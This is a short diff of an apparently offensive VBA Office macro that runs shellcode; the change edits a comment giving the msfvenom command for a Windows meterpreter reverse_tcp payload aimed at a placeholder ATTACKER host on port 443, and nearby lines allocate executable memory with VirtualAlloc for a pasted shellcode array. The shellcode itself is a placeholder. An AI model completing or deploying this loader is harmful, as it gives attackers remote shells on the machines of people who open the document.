@@ -11,7 +11,7 @@ Sub MyMacro()
     Dim res As LongPtr
 
     
-    ' Output Shellcode from the "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vbapplication"
+    ' Output Shellcode from the "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vbapplication EXITFUNC=thread"
     buf = Array(SHELLCODE to be pasted here in brackets)
     ' Allocate memory space
     addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
